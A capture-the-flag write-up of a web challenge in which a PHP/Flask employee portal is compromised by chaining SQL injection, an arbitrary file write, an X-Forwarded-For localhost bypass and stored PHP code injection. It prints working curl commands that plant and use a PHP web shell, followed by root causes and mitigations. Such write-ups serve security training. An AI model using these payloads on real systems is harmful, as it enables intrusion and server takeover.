# Evil Core Employee Portal - CTF Writeup

## Challenge Overview
This challenge involved exploiting a web application with multiple vulnerabilities to achieve Remote Code Execution (RCE) and read the flag.

## Vulnerabilities Discovered

### 1. SQL Injection in Word Cloud Endpoint
- **Location**: `/api/processor/word-cloud.png?review=`
- **Vulnerability**: The `review` parameter was directly used in a SQL query without proper sanitization
- **Impact**: Allows arbitrary SQL queries to be executed

### 2. Arbitrary File Write in Admin Export Endpoint
- **Location**: `/api/processor/admin/export/reviews?filename=`
- **Vulnerability**: The `filename` parameter was used directly in `os.path.join()` without validation
- **Impact**: Allows writing files to arbitrary locations on the filesystem
- **Access Control**: Restricted to localhost only

### 3. PHP Code Injection in Self-Review Form
- **Location**: Self-review content field
- **Vulnerability**: User input was stored in database and could contain PHP code
- **Impact**: When combined with file write, enables RCE

## Exploitation Chain

### Step 1: Authentication
```bash
curl -X POST "http://94.237.49.175:43679/" \
  -d "employee_id=elliot&password=system1" \
  -c cookies.txt
```

### Step 2: Inject PHP RCE Payload
```bash
curl -X POST "http://94.237.49.175:43679/self-review/update" \
  -b cookies.txt \
  -d "content=<?php system(\$_GET['c'] ?? 'id'); ?>&rating=5"
```

### Step 3: Bypass Access Control and Create Shell
The admin endpoint was restricted to localhost, but we bypassed this using headers:
```bash
curl -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" \
  "http://94.237.49.175:43679/api/processor/admin/export/reviews?filename=/www/public/shell.php"
```

### Step 4: Execute Commands and Get Flag
```bash
# Test shell
curl "http://94.237.49.175:43679/shell.php?c=id"

# Get flag
curl "http://94.237.49.175:43679/shell.php?c=/readflag"
```

## Root Cause Analysis

1. **SQL Injection**: Missing input validation and parameterized queries
2. **Arbitrary File Write**: No path traversal protection in filename parameter
3. **Access Control Bypass**: OpenLiteSpeed configuration only checked `X-Forwarded-For` header
4. **Code Injection**: User input stored in database without proper sanitization

## Impact
- Complete server compromise
- Ability to execute arbitrary commands
- Access to sensitive files including the flag
- Potential for lateral movement and persistence

## Mitigation Recommendations

1. **Input Validation**: Implement proper input validation and sanitization
2. **Parameterized Queries**: Use prepared statements for all database queries
3. **Path Traversal Protection**: Validate and sanitize file paths
4. **Access Control**: Implement proper authentication and authorization
5. **Code Sanitization**: Escape user input before storing in database
6. **Security Headers**: Don't rely solely on headers for access control

## Flag
The flag was successfully obtained using the `/readflag` setuid binary after achieving RCE through the combination of vulnerabilities.

## Technical Details

### Application Architecture
- **Frontend**: PHP/Slim framework with Twig templates
- **Backend**: Python Flask API for word cloud generation
- **Database**: MySQL
- **Web Server**: OpenLiteSpeed with reverse proxy configuration

### Key Files
- `challenge/pyapi/main.py` - Python API with file write vulnerability
- `challenge/web/src/Application/Actions/SelfReview/UpdateSelfReviewAction.php` - Review update handler
- `conf/vhconf.conf` - OpenLiteSpeed configuration with access control

### Exploitation Timeline
1. Discovered SQL injection in word cloud endpoint
2. Found arbitrary file write in admin export endpoint
3. Identified access control bypass using headers
4. Injected PHP RCE payload into self-review
5. Created web shell using file write vulnerability
6. Executed commands to obtain flag

## Lessons Learned
- Always test for multiple vulnerability types in web applications
- Access control bypasses can be as simple as header manipulation
- Chaining vulnerabilities can lead to complete system compromise
- Input validation is critical at every layer of the application

